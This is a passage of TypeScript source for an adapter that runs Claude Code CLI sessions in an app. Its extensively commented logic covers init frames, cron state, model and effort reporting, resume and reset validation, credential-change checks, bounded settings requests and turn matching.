            if (event.cause === 'auth_stale') loginRefused = true
          }
        }
        // End a child after fatal credential rejection. It holds a launch-time Keychain access token without a refresh token or live reread, so another turn in that same process would fail identically.
        //
        // Leaving it open costs him turns and leaves a status that disagrees with what the session
        // can do (099). Ending it is the honest state AND the remedy: a reopened conversation reads
        // the Keychain again, and the same ledger shows that working — his next session launched 22
        // seconds later and authenticated fine.
        if (fatalReported) {
          this.finishAfterReportedFatal(loginRefused)
          return
        }
        // AFTER the pure normalization, never before: the checklist a todo call produces has to
        // land behind the `tool_call` row it supersedes, or the fold would be asked to mark an item
        // that does not exist yet.
        for (const event of this.todoPlan.observe(message)) this.emit(event)
        // 🔴 **`system/init` gets NO `scheduled_work` arm, and 253's first draft gave it one** (253).
        //
        // That draft emptied the level here, copying what `247` does one event over, on the
        // reasoning `CronCreate`'s own receipt gives: a cron is *"session-only … dies when Claude
        // exits"*. ⛔ **The live capture falsified it twice**, and each failure erases a job that is
        // still scheduled rather than merely being redundant:
        //
        //  1. **Every scheduled FIRE re-emits `system/init` on the SAME stream.** Measured: one
        //     process, one `query()`, one `session_id` — `init` at 10 194 ms, then 54 805 ms and
        //     114 037 ms as the cron woke the session twice. An empty level there blanks a live job
        //     for the whole fired turn.
        //  2. **A RESUMED session still holds its crons.** Measured: a new CLI process resuming
        //     `ea1f67f9` reported the same `e3826cc5` on a `Stop` at 4 336 ms — before its own first
        //     prompt at 4 526 ms, so the resume itself restores it. The receipt's "dies when Claude
        //     exits" does not mean what an app would read it to mean, and the replayed ledger this
        //     emit existed to correct was already telling the truth.
        //
        // ⚑ **So every level BroBot publishes is one the provider actually SAID.** A session that has
        // not yet ended a turn reports nothing at all — `jobs` absent, *"we have not been told"*.
        // See `session-crons.ts`. Everything below this line is about the model and the effort.

        // The EFFECTIVE model, as the provider reports it (081). `system:init` carries `model`
        // (verified in the pinned SDK types) — what we pass is a request, often an alias Claude
        // resolves (`default`, `opus`), so this is the only honest source.
        //
        // Reasoning effort is a different story, and 081's comment here got it wrong (024): the
        // pinned SDK (0.3.281) DOES expose a knob — `Options.effort?: EffortLevel` at sdk.d.ts:1855
        // — and we now set it. What it does not expose is any way to read the effort BACK:
        // `system:init` carries model, cwd, tools, permissionMode and no effort field, and nothing
        // else on the message stream does either. ⚑ (680: 0.3.281 DECLARES `init.effort?`, for Remote
        // Control bridge frames by its own doc — and this app's init frames at 2.1.281 carry no
        // `effort` key, measured on a `max`-effort launch; see `fixtures/claude-model-floor-refusal`.
        // A declared field is not a sent one.) So what we surface until a turn ends is the value we
        // ASKED for, flagged as such — the SDK documents a silent downgrade on models that do not
        // support the level, so presenting a request as a confirmation would be exactly the wrong
        // kind of confident.
        //
        // `efforts.effective` rather than the launch value (076): the effort can now move
        // mid-conversation, and reporting the one the session opened with would go stale the moment
        // it did. `effective` is what the last turn we sent asked for, which is the strongest true
        // statement available before Claude states it at the turn's end (F099, below).
        //
        // ⚑ **F099 · and the effort is read BACK after all, at each turn's end** — the `Stop` hook's
        // `effort.level` ({@link noteReportedEffort}). Until a turn of this launch has ended, what
        // is shown is still the request, flagged as such; ⚑ after one, the reported level stands
        // across the next turn's `init` while the model and the asked-for effort are the ones that
        // turn ran with.
        if (message.type === 'system' && message.subtype === 'init' && message.model) {
          const asked = this.efforts.effective
          const reported = this.effortReported
          this._agentInfo =
            reported !== undefined && reported.model === message.model && reported.asked === asked
              ? {
                  model: message.model,
                  reasoningEffort: reported.level,
                  reasoningEffortReported: true,
                }
              : {
                  model: message.model,
                  ...(asked ? { reasoningEffort: asked, reasoningEffortReported: false } : {}),
                }
        }
        // ⛔ **Not folded into the branch above**, whose guard is `message.model` — a frame that
        // named no model would carry its tool list all the same, and an inventory lost because the
        // model field happened to be empty is the silent half of `an-unenumerated-state-counts-as-
        // success`. This arm's only condition is that the frame IS an init.
        if (message.type === 'system' && message.subtype === 'init') {
          this.skillCatalogueConfirmed = false
          if (this.builtInSkills) {
            verifyClaudeBuiltInSkills(message, this.builtInSkills)
            this.skillCatalogueConfirmed = true
          }
          this.publishToolInventory(message)
        }
        const candidate = claudeSessionRef(message, this.cwd, this.rotation)
        // Read only the first `system/init` of a launch for identity. Later frames can report a Bash-changed cwd or another id after `/clear`; they are not resume identity claims. `probe:claude-resume-after-cd` covers this behavior.
        //
        // ⛔ **So a later init skips the barrier AND the machine**, not only the barrier: a session
        // in `closing` is not `active`, so `sessionStarted` would reopen it and announce the moved
        // ref — which the host archives and reopens from (715's review, F1). The ref keeps the
        // LAUNCH cwd: where the provider keeps the transcript, and what a resume must ask for.
        // ⚑ **`721` · R75 — the one later init that IS read: the one after a reset, for the ref's id
        // and nothing else** (the `else if` below). R64 stands for every other.
        if (candidate && !this.initRead) {
          this.initRead = true
          // The provider-reported cwd, raw (before claudeSessionRef's started
          // fallback) — the resume barrier must match against what the SDK proved.
          const rawInitCwd =
            message.type === 'system' && message.subtype === 'init' ? message.cwd : ''
          // 🔴 **721 · R76 — a reset before the first init is the person's own command.** ⚑ Only on a
          // resume, and only on the CLI's own proof it resumed THIS conversation before clearing it:
          // the reset frame's `session_id` is the one asked for. The cwd is still matched exactly.
          const afterTheirReset =
            this.opening === 'resumed' &&
            this._targetRef !== null &&
            this.resetPending?.from === this._targetRef.sessionId
          this.resetPending = null
          const validated = this.validateInitRef(candidate, rawInitCwd, afterTheirReset)
          if (!validated) return // resume mismatch / malformed init → session failed
          if (afterTheirReset && validated.sessionId !== this._targetRef?.sessionId) {
            // ⚑ The session opens as the conversation it RESUMED, then moves — with a seam — to the
            // one the `/clear` began (R75's ref), exactly as a `/clear` later in its life would.
            this.machine.sessionStarted(
              { ...validated, sessionId: this._targetRef?.sessionId ?? validated.sessionId },
              this.opening,
            )
            this.emit({ type: 'conversation_reset', ref: validated, source: RESET_SOURCE })
          } else {
            this.machine.sessionStarted(validated, this.opening)
          }
        } else if (candidate && this.resetPending !== null) {
          // 🔴 **721 · R75 — after a `/clear`, the ref follows the TRANSCRIPT: this init's id.** ⚑ The
          // one later init R64 lets through, and only for the ref — no barrier, no machine: the
          // session is not re-opened, it moves (`199`'s own door, below). R64 stands for every other
          // later init. ⚑ `refAfterReset` keeps the cwd the ref is on, never this init's (715).
          this.resetPending = null
          const moved = refAfterReset(this._ref, candidate.sessionId)
          if (moved) this.emit({ type: 'conversation_reset', ref: moved, source: RESET_SOURCE })
        }
        // ⛔ **The ref FOLLOWS a reset** (199, from 192 H5) — raised in this loop (since `721`, by the
        // R75 arm above, off the init after the reset) rather than in `normalizeMessage`, for the
        // same reason `system/init`'s is: a `SessionRef` needs the cwd and rotation this session was
        // launched with, and the pure normalizer is given neither.
        //
        // ⚠️ **`sessionStarted` is deliberately NOT called for it, and its guard at
        // `session-machine.ts:239-241` is deliberately not touched.** That guard says two things and
        // both are still true afterwards: a TERMINAL session never returns to `active` and never
        // publishes another opening, and an ACTIVE session announces its opening exactly once — so a
        // second `system/init` restates no `started`/`resumed` and re-runs no `sync()`. A reset is
        // neither of those events. It does not open the session, so it goes through its own door,
        // moves no state and republishes no status. (R76's opening is the target's own, proven by
        // the reset frame; the reset still goes through its own door right after it.)
        //
        // ⛔ **And there is no terminal guard on that emit, which is a MEASUREMENT rather than an
        // omission.** The first version of it read `this.machine.isTerminal ? null : …`, and 199's
        // own mutation table proved the check inert: removing it left every test green. `isTerminal`
        // is `closed | errored`, and every path that reaches either sets `this.terminated` in the
        // same synchronous block — at which point the `for await` above stops reading and this line
        // is never reached again. Every other event in this loop is unguarded for the same reason;
        // a check here only for the reset would have been the one line in the file whose protection
        // nothing could demonstrate. 198's rule, applied to my own code.
        // 🔴 **721 · R75 — the reset itself moves nothing; the init after it does** (above). ⛔ `199`
        // emitted here, with the frame's `new_conversation_id` — measured to have no transcript, so
        // every `/clear`ed conversation became one no Resume could open.
        const reset = claudeConversationReset(message)
        if (reset) this.resetPending = reset
        // ⚑ **F074 — and the usage limit a turn ended on rides its ending** ({@link ClaudeLimitWatch}).
        this.limits.observe(message)
        // A turn refused because its account can't pay carries that on its ending.
        this.billing.observe(message)
        const outcome = claudeResultOutcome(message)
        if (outcome) {
          const limit = this.limits.turnEnded(outcome.outcome, Date.now())
          const billingRefused = this.billing.turnEnded(outcome.outcome)
          this.machine.completeTurn(
            outcome.outcome,
            outcome.message,
            limit,
            this.resultIsTheTurns(message) ? 'the-open-turn' : 'not-the-open-turn',
            billingRefused
              ? { billingRefused: true, ...(this.launchedOnAKey ? { onAKey: true } : {}) }
              : undefined,
          )
        }
      }
      // ⛔ **`closing !== null` is not tidiness — 202 needed it** (191 H3). `close()` now awaits the
      // CLI's exit receipt, and the very first thing that receipt does is end this stream. So there
      // is an interval, for the first time, in which the stream ends WHILE a teardown is in flight
      // and the machine has not yet been closed — and without this guard the adapter read its own
      // orderly shutdown as the provider dying and published `errored` instead of `ended`.
      // ⚑ It is the honest predicate either way: a stream that ends after somebody asked to close is
      // not an unexpected end, whatever killed it.
      if (!this.machine.isTerminal && this.closing === null) {
        this.finishUnexpected(`the provider stream ended unexpectedly${this.stderrClause()}`)
      }
    } catch (error) {
      if (!this.machine.isTerminal && this.closing === null)
        this.finishUnexpected(`${errorMessage(error)}${this.stderrClause()}`)
    }
  }

  /**
   * ⚑ **The `. stderr: …` clause, put back where a person reads it** (240 §3, from 233).
   *
   * ⛔ **233 took it away and said so.** Owning the spawn (`Options.spawnClaudeCodeProcess`) means
   * the SDK reads no stderr from our child, so its `formatStderrTail()` has nothing to append and
   * the clause vanished from the sentence the adapter turns into a fatal session error. 233 called
   * that *"a real cost of this change rather than a neutral refactor"* and named restoring it as a
   * follow-up; this is it. The tail was never lost — {@link watchClaudeChild} logs it on a non-zero
   * exit, per 085 — but the log is not where a user is looking when a session dies.
   *
   * ⚠️ **Only on the two paths where the CLI's own output explains the ending**: the stream ending
   * unexpectedly, and a throw out of the stream. ⛔ **Not on `failResume`**, whose reason is our own
   * validation — a resume-mismatch message is about what we expected, and appending a provider's
   * stderr to it would attribute our sentence to them. That is the same line 151/162 draw around
   * invented causes, applied to a real cause pasted onto the wrong effect.
   *
   * Bounded to the last {@link STDERR_CLAUSE_BYTES}, matching what `SpawnCodexTransport` puts in its
   * own exit message, so one provider crashing verbosely cannot produce an error nobody can read.
   *
   * ⛔ **It cannot throw, and that is not defensive habit — it is the second call site** (240,
   * this dispatch's own adversarial pass). {@link child} is declared with a definite-assignment
   * `!`, so a handle that reached the run loop without {@link attachQuery} would raise here. The
   * FIRST call site is inside `runLoop`'s `try`, so that raise would be caught — and handed
   * straight to the `catch`, whose own `finishUnexpected` calls this again, unguarded, out of a
   * `void this.runLoop()`. An unhandled rejection, from a diagnostic. {@link ClaudeChildWitness}
   * already writes the rule this obeys: *"a witness is a diagnostic and must not be able to cost a
   * session."*
   */
  private stderrClause(): string {
    try {
      const tail = this.child.stderrTail.trim()
      return tail === '' ? '' : `. stderr: ${tail.slice(-STDERR_CLAUSE_BYTES)}`
    } catch {
      return '' // no witness to ask — the ending is still reported, one clause poorer
    }
  }

  /**
   * 🔴 **F080 — does this `result` answer the open turn's own message?** — it names that message's
   * uuid ({@link sentForTheTurn}) in `user_message_uuids`, or in `user_message_uuid` alone.
   *
   * ⚑ Measured on CLI 2.1.287 (`probe:claude-provider-burst`): every result that answers one of this
   * app's messages names its uuid — an ordinary turn, a person's local command (`/cost`, which runs
   * no model), and a turn the usage limit refused — and a loop the CLI ran for itself names none: a
   * wake after a background task ended, and, resumed after a restart stopped background work, the
   * empty loop it ends for the stopped task's notice before it answers our message. A person's and
   * an agent's message (`origin`), `/compact` and `/clear` are answered the same way.
   * `claude-provider-bursts.json` pins the shipped CLI to that.
   *
   * ⚑ The SDK documents the echo on every result of a turn that had a client uuid or folded one
   * in, error results included, and its absence only on loops of the CLI's own and on failures with
   * no single send behind them — which, run locally, end the process (the fatal path).
   */
  private resultIsTheTurns(message: SDKMessage): boolean {
    const sent = this.sentForTheTurn
    if (sent === null || sent.turnId !== this.machine.activeTurnId) return false
    const said = message as { user_message_uuid?: unknown; user_message_uuids?: unknown }
    return (
      said.user_message_uuid === sent.uuid ||
      (Array.isArray(said.user_message_uuids) && said.user_message_uuids.includes(sent.uuid))
    )
  }

  /** The provider process died mid-session: errored + settle pending, not a clean end. */
  private finishUnexpected(reason: string, endedByThisAdapter = false): void {
    this.settleRequests()
    this.machine.fatalError(reason, endedByThisAdapter) // emits the terminal turn (if any) + errored
    this.releaseProvider()
  }

  /**
   * The credential this child was launched with was refused, so nothing it does next can work (110).
   *
   * Identical to {@link finishUnexpected} except that the error has **already** been emitted — by
   * `normalizeMessage`, in the provider's own words and with the `cause` a surface reads. Saying it
   * again here would be the same failure twice in one transcript.
   */
  private finishAfterReportedFatal(loginRefused: boolean): void {
    this.settleRequests()
    this.machine.fatalAfterReportedError(
      loginRefused ? { loginRefused: true, ...(this.launchedOnAKey ? { onAKey: true } : {}) } : {},
    )
    this.releaseProvider()
  }

  /**
   * Release the provider resources from a terminal state (023 P1-A): detach the SDK query and close
   * the input queue so nothing leaks even if the app never calls close() afterward.
   */
  private releaseProvider(): void {
    this.detachQuery()
    this.input.close()
    this.terminated = true
    this.eventQueue.close()
  }

  /** Best-effort detach of the SDK query (idempotent): after this no further messages arrive. */
  private detachQuery(): void {
    this.messageReceipts?.close()
    if (this.query) {
      try {
        this.query.close()
      } catch {
        // best-effort detach
      }
    }
  }

  /**
   * Detach, **and wait for the CLI to be gone** (202, from 191 H3) — see {@link ClaudeQuery.return}
   * for what makes that possible and for the measurement.
   *
   * ⛔ **`close()` first, then the receipt.** They are the same teardown at the SDK — `cleanup()` is
   * memoized — so this is not two teardowns; it is starting the one there is and then joining it.
   * Calling `close()` unconditionally also means a fake that has no `return` sees exactly what it
   * saw before.
   *
   * ⚠️ **Bounded and never rejecting**, because this runs inside a teardown barrier a quit is
   * waiting on: a CLI that will not exit must not be able to hold the application open. Five seconds
   * against the SDK's own two-second `waitForExit` race plus its cleanup callbacks and transcript
   * flush — measured at 186–280 ms, so the bound is roughly twenty times the observed cost.
   */
  private async detachQueryAwaitingExit(): Promise<void> {
    const query = this.query
    this.detachQuery()
    if (!query?.return) return
    try {
      await withTimeout(Promise.resolve(query.return()), CLOSE_EXIT_RECEIPT_TIMEOUT_MS)
    } catch {
      // `withTimeout` swallows a rejection of its argument; this covers a `return` that throws
      // synchronously. Either way there is nothing further a teardown can do about it.
    }
  }

  private settleRequests(permissionAnswer?: PermissionDecision): void {
    this.permissions.settleAll(permissionAnswer === undefined ? undefined : () => permissionAnswer)
    this.userInputs.settleAll()
  }

  /**
   * Validate the `system/init` ref before it is accepted as the session ref
   * (011, fixing 007 P1-4). Rejects a malformed (empty-id) init, and for a
   * resume requires an **exact** `sessionId` + `cwd` match against the requested
   * ref — the SDK could report a fresh session/cwd, which must NOT be surfaced
   * as a successful `resumed`. Returns the validated ref, or `null` after
   * terminalizing the session as a resume failure.
   *
   * 🔴 **715 · R64 — called ONCE per launch, on its first init** (see the gate in `runLoop`). Until
   * R64 it was called on every init, and a later one naming the folder the model `cd`'d into ended
   * a reopened conversation. ⛔ **The barrier's purpose stands**: the first init after a resume that
   * names another session, or another launch cwd — the moved folder included — still fails it.
   *
   * 🔴 **`721` · R76 — save one case: the target's OWN reset came first.** A reopen whose first
   * message is `/clear` sends `conversation_reset{session_id: <the target>}` and then an init naming
   * the conversation the `/clear` began — measured, and until `721` it ended here as *"resume
   * mismatch"*. The reset frame is the CLI's proof it resumed the target; the id may then differ.
   * ⛔ The cwd may not, and a reset from any other conversation proves nothing.
   */
  private validateInitRef(
    candidate: SessionRef,
    rawInitCwd: string,
    /** ⚑ 721 · R76 — the target's own reset came first: the id may differ, the cwd may not. */
    afterTheirReset = false,
  ): SessionRef | null {
    const parsed = sessionRefSchema.safeParse(candidate)
    if (!parsed.success) {
      this.failResume(`malformed session init: empty or invalid session id`)
      return null
    }
    if (this.opening === 'resumed' && this._targetRef) {
      // Match the RAW provider-reported cwd, not claudeSessionRef's started
      // fallback — else an omitted/empty init cwd would echo the requested cwd
      // and pass the identity barrier vacuously.
      // ⚑ 721 · R76: after the target's own reset the id is the new conversation's; the cwd is not.
      const sameConversation = afterTheirReset || candidate.sessionId === this._targetRef.sessionId
      if (!sameConversation || rawInitCwd !== this._targetRef.cwd) {
        this.failResume(
          `resume mismatch: expected ${this._targetRef.sessionId}@${this._targetRef.cwd}, ` +
            `got ${candidate.sessionId}@${rawInitCwd || '(empty cwd)'}`,
        )
        return null
      }
    }
    return parsed.data
  }

  /** A resume/init that could not be validated: detach the query, then errored + freeze. */
  private failResume(reason: string): void {
    if (this.query) {
      try {
        this.query.close()
      } catch {
        // best-effort detach
      }
    }
    this.input.close()
    this.finishUnexpected(reason, true)
  }

  // --- SessionHandle contract ---

  events(): AsyncIterable<RuntimeEvent> {
    return this.eventQueue
  }

  status(): SessionStatus {
    return this.currentStatus
  }

  isRetiring(): boolean {
    return this.machine.state === 'closing'
  }

  /**
   * **What this tool answered, as much of it as we are holding** (462) — see
   * {@link SessionHandle.toolAnswer}.
   *
   * ⛔ **This adapter holds a receipt for EVERY tool, and Codex's holds two kinds**, and the
   * asymmetry is the wire's rather than a decision either adapter made. Claude delivers one
   * `tool_result` block shape for `Bash`, `Read` and an MCP tool alike, so narrowing it to the
   * calls with a structured half would need a second registry remembering which `tool_use` each
   * receipt answers — a derivation bought for nothing. Codex delivers a different item type per
   * kind, and `codexToolAnswerParts` names the two that carry an ANSWER.
   */
  toolAnswer(toolCallId: string): ToolAnswer | null {
    return this.toolAnswers.read(toolCallId)
  }

  /**
   * ⚑ **446 · the app's own park joins the count the two brokers use** — see
   * {@link SessionHandle.waitForAPerson}. ⛔ Nothing adapter-specific: this adapter contributes the
   * machine, and the machine is the one derivation every `status` comes out of.
   */
  waitForAPerson(): () => void {
    this.machine.beginWait()
    let held = true
    return (): void => {
      // ⚠️ **Idempotent, and the flag is the whole of it.** `endWait` floors at zero, so a second
      // release would silently spend the NEXT card's wait rather than throwing — which is the
      // trade that method already refuses in the other direction.
      if (!held) return
      held = false
      this.machine.endWait()
    }
  }

  /** Record the digest of the credential actually injected into this child (147). Called once. */
  noteLaunchCredential(fingerprint: string): void {
    this.launchCredential = fingerprint
  }

  /**
   * ⚑ **This child was handed the person's API key, not the machine login** — read off the same one
   * read of the credential {@link noteLaunchCredential} digests, so a refusal later says which one it
   * refused (`onAKey`, see `events.ts`).
   */
  noteLaunchedOnAKey(): void {
    this.launchedOnAKey = true
  }

  /** Of the login this session launched with, so a renewed login answers another tag. */
  signInTag(): string | null {
    return this.launchCredential === null ? null : signInTagOf(this.launchCredential)
  }

  /**
   * Has the machine sign-in moved since this child was launched? (147) — **latched**, so every
   * later reader is free.
   *
   * ⚠️ **Called at a TURN BOUNDARY — and, since the desktop's `690`, when an agent asks to wake a
   * conversation that is running** (the wake asks the turn gate's own guard before it answers
   * *running*) — and never for a listing, because it costs a `security find-generic-password`
   * subprocess. {@link signInSuperseded} is what disclosures read.
   *
   * ## What it can and cannot tell you, measured
   *
   * ⛔ It reports that the CREDENTIAL moved, not that the ACCOUNT changed — the Keychain blob carries
   * no account identity at all (147 §1; see {@link credentialFingerprint}). An ordinary refresh looks
   * exactly like a deliberate switch from here, and the access token lives **8 hours**
   * (110 §1: item `mdat` + 8 h == `expiresAt`, to the second), so this fires at most about once per
   * token life per machine — every Claude client on the machine shares the one item.
   *
   * ⚠️ **A read that yields nothing is NOT a supersession**, and that asymmetry is deliberate. A
   * missing or expired machine login means we cannot tell what the current credential is; refusing a
   * turn on "we could not look" would take a conversation away over a Keychain the user may simply
   * have locked. The launch-time path already fails closed on an absent login
   * ({@link ClaudeRuntime.childEnvAdditions}), which is where fail-closed belongs — before a child
   * exists, not against one that is running fine.
   *
   * ⛔ **A TIMED-OUT read takes that same branch, and 149 chose it on purpose.** `security` is bounded
   * at `KEYCHAIN_READ_TIMEOUT_MS` and a killed read yields null, so a locked Keychain fails OPEN: the
   * turn goes. The alternative — refusing every turn in every conversation because a daemon is
   * wedged — makes an unreachable Keychain into an unusable app, and it would do it silently, since
   * "we could not look" and "you switched account" would then be the same refusal. If the token
   * really has been revoked, `110`'s `auth_stale` notice still catches it a moment later, with its
   * own remedy attached. Availability here, fail-closed at launch: each where it costs least.
   */
  async checkSignIn(): Promise<boolean> {
    if (this._signInSuperseded) return true
    if (this.launchCredential === null || !this.authTokenProviderAsync) return false
    // ⚠️ **The read is awaited, not blocked on** (149, 148 H4) — and it is bounded by
    // `KEYCHAIN_READ_TIMEOUT_MS`, whose expiry arrives here as the same `null` every other
    // unavailability does. See {@link defaultKeychainReaderAsync}.
    const current = await this.authTokenProviderAsync()
    if (current === null) return false // cannot tell — never a refusal, see above
    if (credentialFingerprint(current) === this.launchCredential) return false
    this._signInSuperseded = true
    return true
  }

  /** The latched answer (147) — free to read, and what the liveness disclosure carries. */
  get signInSuperseded(): boolean {
    return this._signInSuperseded
  }

  async send(text: string, origin?: TurnProvenance): Promise<void> {
    const turnId = this.machine.beginTurn()
    // ⚑ **Which half of the `null` it was, as a type** (650) — see `SessionMachine.refusedTurn`.
    if (turnId === null) throw this.machine.refusedTurn()
    // A turn is the boundary a mode change crosses (034), on both providers and for the same
    // reason: what the tools of a turn already in flight are governed by must not move under them.
    //
    // ⚠️ **The approval mode is rolled back if the settings below fail, and 076 is why it has to
    // be** (found in review). Before 076 nothing between this line and the push could throw, so an
    // adopt here was final by construction. `applyPendingSettings` can now reject — three SDK
    // control requests — and without the rollback the session would go on reporting a mode the SDK
    // was never told about, for the rest of its life, on the one setting where being wrong is a
    // safety claim. The Codex adapter has had exactly this rollback since 034, for the same reason
    // and in the same shape; this is the half that had not needed one until now.
    const modeBefore = this.approvals.effective
    this.approvals.adopt()
    try {
      await this.applyPendingSettings()
    } catch (error) {
      // `requested` is deliberately untouched: the user still wants the change, and the turn they
      // send after the failure re-applies the whole set.
      this.approvals.rollback(modeBefore)
      throw error
    }
    // ⛔ **The turn this method opened must still be the turn that is running** (202, from 191 H5).
    //
    // Everything above is an `await`, and Stop is what can land during it: `interrupt()` bounds the
    // SDK ack at two seconds and then FORCE-ENDS the turn locally, so by the time the settings
    // resolve the app has already told the user the turn is over — published `interrupted`, gone
    // idle, put the composer back. The push below would then start provider work anyway, including
    // consequential tools, on a session the user believes they stopped. ⚑ **086's rule, and 122's
    // before it: the app must not run a turn it has said it ended.**
    //
    // ⚠️ **`activeTurnId === turnId`, not `hasActiveTurn`.** The weaker question passes when a turn
    // is open — and a turn IS open in the case that matters most, because `sendInterrupting` opens
    // the replacement. Sending this message into it would attribute the stopped turn's text to the
    // one that replaced it, which is the shape 042 measured from the other end.
    if (this.terminated || this.machine.activeTurnId !== turnId) {
      throw new Error('the turn was stopped before its message could be sent')
    }
    // 🔴 **662 · who wrote these words, in the SDK's field for it** — see {@link claudeOriginOf}.
    // ⛔ **Spread, so an omitted origin pushes the exact object this pushed before `662`**, with no
    // `origin` key at all. An `origin: undefined` would serialise away too, but the object the
    // test captures would not be the old shape.
    const stamped = claudeOriginOf(origin)
    // 🔴 **F080 — every message this app sends carries its own uuid**, which the CLI echoes on the
    // `result` that answers it (`user_message_uuid(s)`), so the turn ends on ITS result and never on
    // one the CLI wrote for a loop of its own ({@link resultIsTheTurns}).
    const uuid = randomUUID()
    this.sentForTheTurn = { turnId, uuid }
    this.input.push({
      type: 'user',
      message: { role: 'user', content: text },
      parent_tool_use_id: null,
      uuid,
      ...(stamped === undefined ? {} : { origin: stamped }),
    })
  }

  /**
   * Push the queued model/effort/plan changes to the SDK, at the turn boundary (076) — and, since
   * W4.189, the work folders.
   *
   * ⚠️ **Each setting adopts only if its own call SUCCEEDED, and that is the whole design.** These
   * are three independent control requests over the same transport, so a partial failure is a real
   * outcome: adopting first and calling afterwards would leave the session reporting a model the CLI
   * had refused. Adopting per-call means `effective` is always something the SDK acknowledged, and a
   * setting whose call failed keeps its `requested` value and rides the next turn instead.
   *
   * ⚠️ **It throws BEFORE the message is queued**, which is what makes that recoverable. `send`
   * begins the turn, then calls this, then pushes the text — so a throw here leaves a begun turn with
   * nothing driving it, exactly the "session bricked by its own guard" shape 057's review named on
   * the other adapter. Which is why the catch terminalizes the turn on the way out rather than
   * letting the error escape alone.
   */
  /**
   * One control request, bounded (202, from 191 H5) — see {@link SETTINGS_ACK_TIMEOUT_MS}.
   *
   * ⚠️ **Per call rather than around the group**, because the group is three independent requests
   * and {@link applyPendingSettings} adopts each only if its own call succeeded. A single bound over
   * all three would let a slow first one spend the budget the third needed, and the third would then
   * be reported as refused by the CLI when it had simply never been asked.
   *
   * `undefined` — the method is missing on this query — passes straight through: an absent optional
   * is not a call that failed to answer, and the caller treats it as "this query cannot be
   * re-modelled" a line later.
   */
  private async settled(call: Promise<void> | undefined, what: string): Promise<void> {
    if (call === undefined) return
    await withDeadline(call, SETTINGS_ACK_TIMEOUT_MS, `claude ${what}`)
  }

  private async applyPendingSettings(): Promise<void> {
    const turnId = this.machine.activeTurnId
    let reloadTimedOut = false
    try {
      if (this.sharedSkillsRoot) {
        if (!this.query?.reloadPlugins) throw new Error(BUILT_IN_SKILLS_FAILURE)
        const reload = this.query.reloadPlugins()
        try {
          await withDeadline(reload, 60_000, 'reloadPlugins')
        } catch (error) {
          reloadTimedOut = didNotAnswerInTime(error)
          throw error
        }
      }

      if (this.models.pending) {
        // `setModel(undefined)` is the SDK's own way to say "back to the default" — its signature is
        // `setModel(model?: string)` and the doc reads "or undefined to use the default". So handing
        // our own `undefined` straight through is the documented gesture, not a coincidence.
        await this.settled(this.query?.setModel?.(this.models.requested), 'setModel')
        this.models.adopt()
      }
      if (this.efforts.pending) {
        const wanted = this.efforts.requested
        // `null` is the SDK's own spelling of "stop asking" — `undefined` is documented as dropped
        // by JSON serialization and would have no effect at all, i.e. it would silently do nothing.
        // ⚑ Its meaning moved on the 0.3.281 bump (680): 0.3.218 documented it as *"clear it from
        // the flag layer and fall back to lower-precedence sources"*; 0.3.281 documents
        // `effortLevel: null` as resetting session state — *"goes to the model's default effort"*
        // (`sdk.d.ts:2791`) — which is "the provider's own default" more exactly than the old one.
        //
        // The non-null branch cannot fail its narrowing: `setReasoningEffort` refused anything
        // outside `CLAUDE_EFFORTS` before recording it, so `claudeEffort` returning null here would
        // mean a value was queued without passing that gate. Falling back to `null` rather than
        // asserting keeps the failure "we stopped asking" instead of a crash mid-turn.
        await this.settled(
          this.query?.applyFlagSettings?.({
            effortLevel: wanted === undefined ? null : claudeEffort(wanted),
            ...(this.ultracodeAsked ? { ultracode: true } : {}),
          }),
          'applyFlagSettings',
        )
        this.efforts.adopt()
      }
      if (this.folders.pending) {
        const next = this.folders.requested
        // 🔴 **W4.189 · the work folders, as `permissions` in the flag layer.** The same list in a new
        // array is no change, and asks the CLI nothing.
        if (!sameFolders(next, this.folders.effective)) {
          // ⛔ **A query that cannot take it fails the turn, by name** — `setWorkFolders` returns
          // nothing, so this is the first place that can say so, and adopting a list the CLI was
          // never told about would report a grant that does not exist.
          if (!this.query?.applyFlagSettings) {
            throw new Error(
              'cannot change the work folders: the pinned SDK query exposes no applyFlagSettings()',
            )
          }
          // ⚠️ **The kept rules ride beside the list, every time**: this call REPLACES the whole
          // `permissions` the launch put in the flag layer ({@link keptRules}). ⚑ And `null` when
          // there are neither — no kept rule, no folder — because that launch wrote no `permissions`
          // key at all: `null` clears the key from the flag layer, and with `settingSources: []` there
          // is no lower settings layer for it to fall back to, so clearing IS the launch state. `{}`
          // would leave a key the launch never wrote.
          await this.settled(
            this.query.applyFlagSettings({
              permissions: flagPermissionsOf(this.keptRules, this.withSharedSkills(next)),
            }),
            'applyFlagSettings',
          )
        }
        this.folders.adopt()
      }
      if (this.plan.pending) {
        // ⚠️ Takes the plan bit ALONE and never the approval mode — see {@link permissionModeFor},
        // which the launch now shares. Moving the approval floor from here would give this app two
        // mechanisms for one safety boundary, which is the thing 034 decided against and
        // {@link approvals} explains at length.
        await this.settled(
          this.query?.setPermissionMode?.(permissionModeFor(this.plan.requested)),
          'setPermissionMode',
        )
        this.plan.adopt()
      }
    } catch (error) {
      // Terminalize the turn `send` just began, or it sits open with nothing driving it and every
      // later send fails with "a turn is in progress" — a session bricked by its own error path.
      // ⛔ `failTurn`, not `completeTurn` (123, review): this is OUR failure, not a terminal the
      // provider sent, so it must not be weighed against the obligations `completeTurn` tracks. A
      // turn opened by `sendInterrupting` inherits the stopped turn's debt, and routing this through
      // `completeTurn` had that debt absorb this very failure — leaving the turn open forever, which
      // is the "session bricked by its own error path" the comment above is about.
      // ⚑ Before the push: the message never left this app (F080 — a burst it joined runs on).
      if (this.machine.activeTurnId === turnId)
        this.machine.failTurn(`could not apply the queued settings: ${errorMessage(error)}`, {
          neverSent: true,
        })
      if (reloadTimedOut) {
        // The deadline released this send, not the SDK's control request. Seal this query before
        // another turn can begin: a late reload answer must never race a second reload or a push.
        // close() enters `closing` synchronously; its bounded child-exit receipt runs in the
        // background so the unsent message gets its failure promptly.
        void this.close().catch(() => {})
      }
      throw error
    }
  }

  /**
   * Answer a permission card.
   *
   * An outcome this adapter cannot honour is REFUSED, loudly, rather than quietly downgraded (031,
   * mirroring Codex's own validation). This is the check that would have made the session-approval
   * bug visible on day one: `allow_for_session` was silently collapsed into a plain `allow`, so the
   * app believed it had granted something it had not and nothing anywhere said otherwise. A
   * decision the adapter will not carry out must never look like one it did.
   *
   * `deny`/`cancel` are never gated — declining has to stay possible whatever was offered, or
   * fail-closed stops being usable. ⚑ **The pair is named by {@link ALWAYS_HONOURED} since 482**,
   * because the Codex adapter held the identical literal and the producers of `availableDecisions`
   * held neither — a rule with two copies and no name is a rule a card can be built against.
   */
